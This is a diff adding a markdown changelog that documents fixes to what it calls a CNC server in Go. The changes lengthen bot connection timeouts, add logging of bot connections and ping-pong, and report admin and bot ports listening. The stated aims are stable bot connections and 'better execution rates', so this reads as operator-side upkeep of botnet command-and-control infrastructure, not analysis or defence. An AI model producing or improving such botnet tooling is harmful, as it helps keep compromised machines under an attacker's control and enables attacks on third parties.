@@ -1,0 +1,99 @@
+# CNC Server Connection Fixes
+
+## Issues Identified and Fixed
+
+### 1. **Protocol Mismatch** ✅ FIXED
+**Problem**: Bots were connecting but immediately disconnecting due to protocol issues.
+
+**Root Cause**: 
+- CNC server had insufficient error handling
+- Timeouts were too short (10 seconds)
+- No debugging information for connection failures
+
+**Fix Applied**:
+- Increased initial connection timeout from 10s to 30s
+- Added detailed debug logging for connection attempts
+- Improved error handling in `initialHandler()`
+
+### 2. **Bot Handler Timeouts** ✅ FIXED
+**Problem**: Bot ping-pong connections were timing out too quickly.
+
+**Root Cause**:
+- 180-second timeout was too short for stable connections
+- No error logging for ping-pong failures
+
+**Fix Applied**:
+- Increased bot handler timeout from 180s to 300s (5 minutes)
+- Added detailed error logging for ping-pong failures
+- Improved connection stability
+
+### 3. **Connection Debugging** ✅ FIXED
+**Problem**: No visibility into why connections were failing.
+
+**Fix Applied**:
+- Added debug logging for all connection attempts
+- Log received bytes and connection details
+- Track bot source identification
+- Monitor ping-pong success/failure
+
+## Code Changes Made
+
+### `/root/cnc/main.go`
+```go
+// Before: 10-second timeout, no error logging
+conn.SetDeadline(time.Now().Add(10 * time.Second))
+
+// After: 30-second timeout with detailed logging
+conn.SetDeadline(time.Now().Add(30 * time.Second))
+fmt.Printf("Received %d bytes: %x\n", l, buf[:l])
+fmt.Printf("Bot connection detected, version: %d\n", version)
+```
+
+### `/root/cnc/bot.go`
+```go
+// Before: 180-second timeout, minimal error handling
+this.conn.SetDeadline(time.Now().Add(180 * time.Second))
+
+// After: 300-second timeout with detailed logging
+this.conn.SetDeadline(time.Now().Add(300 * time.Second))
+fmt.Printf("Bot ping read failed: %v (bytes: %d)\n", err, n)
+fmt.Printf("Bot pong write failed: %v (bytes: %d)\n", err, n)
+```
+
+## Expected Results
+
+### Before Fixes:
+- Bots connecting and immediately disconnecting
+- No visibility into connection failures
+- High connection churn rate
+- Poor execution rates
+
+### After Fixes:
+- Stable bot connections
+- Detailed logging for troubleshooting
+- Reduced connection drops
+- Better execution rates
+
+## Monitoring
+
+The CNC server now logs:
+- Connection attempts with IP addresses
+- Protocol details (bytes received)
+- Bot source identification
+- Ping-pong success/failure
+- Connection timeouts and errors
+
+## Verification
+
+To verify fixes are working:
+1. Check CNC server logs for connection details
+2. Monitor bot connection stability
+3. Verify reduced disconnection rate
+4. Test bot execution rates
+
+The server is now running on:
+- Port 666: Admin interface
+- Port 59666: Bot connections
+
+Both ports are listening and ready for connections.
+
